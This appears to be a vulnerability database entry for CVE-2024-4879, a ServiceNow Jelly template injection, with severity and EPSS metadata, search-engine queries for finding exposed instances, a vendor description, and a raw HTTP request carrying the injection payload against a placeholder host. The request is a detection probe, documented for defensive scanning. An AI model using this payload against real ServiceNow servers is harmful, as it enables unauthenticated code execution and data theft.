---
layout: post
cve_id: CVE-2024-4879
title: ServiceNow UI Macros - Template Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-4879.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4879.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDk,ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can exploit SSTI to execute arbitrary code on ServiceNow
  servers.

  '
remediation: 'Apply security patches for ServiceNow as per KB1644293 and KB1645154.

  '
reference:
- https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
- https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1644293
- https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1645154
- https://nvd.nist.gov/vuln/detail/CVE-2024-4879
classification:
  epss-score: 0.94349
  epss-percentile: 0.99955
metadata:
  verified: true
  max-request: 1
  vendor: servicenow
  product: servicenow
  shodan-query:
  - http.favicon.hash:"1701804003"
  - http.title:"servicenow"
  fofa-query:
  - icon_hash=1701804003
  - title="servicenow"
  google-query: intitle:"servicenow"
tags:
- cve
- cve2024
- servicenow
- ssti
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform.¬†ServiceNow applied an update to hosted instances, and ServiceNow released the update to our partners and self-hosted customers. Listed below are the patches and hot fixes that address the vulnerability. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.


## üåê HTTP Request
```nohighlight
GET /login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

